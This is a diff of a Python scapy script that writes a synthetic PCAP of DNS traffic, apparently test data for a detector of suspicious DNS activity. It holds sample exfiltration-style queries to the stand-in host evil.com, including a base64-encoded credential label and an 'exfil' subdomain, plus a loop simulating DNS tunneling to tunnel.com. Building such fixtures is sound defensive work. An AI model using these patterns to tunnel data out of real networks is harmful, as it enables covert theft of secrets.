@@ -1,14 +1,24 @@
-from scapy.all import DNS, DNSQR, IP, UDP, wrpcap
+from scapy.all import IP, UDP, DNS, DNSQR, wrpcap
 
 packets = []
 
-# Long domain
-pkt1 = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="a"*60 + ".evil.com"))
-# Base64-ish domain
-pkt2 = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="QWxhZGRpbjpvcGVuIHNlc2FtZQ==.evil.com"))
-# TXT record
-pkt3 = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="exfil.evil.com", qtype=16))
+# Normal queries (already in your file)
+packets.append(IP(dst="8.8.8.8", src="192.168.1.10")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="normal.com")))
 
-packets.extend([pkt1, pkt2, pkt3])
+# Suspicious domains (already in your file)
+packets.append(IP(dst="8.8.8.8", src="192.168.1.11")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.com")))
+packets.append(IP(dst="8.8.8.8", src="192.168.1.12")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="QWxhZGRpbjpvcGVuIHNlc2FtZQ==.evil.com")))
+packets.append(IP(dst="8.8.8.8", src="192.168.1.13")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="exfil.evil.com")))
+
+# 🔥 Noisy host: simulate tunneling with 100 queries
+for i in range(100):
+    packets.append(
+        IP(dst="8.8.8.8", src="192.168.1.99")/
+        UDP(dport=53)/
+        DNS(rd=1,qd=DNSQR(qname=f"data{i}.tunnel.com"))
+    )
+
+# Save the PCAP
 wrpcap("examples/fake_suspicious_dns.pcap", packets)
 print("[+] Fake suspicious PCAP created at examples/fake_suspicious_dns.pcap")
+
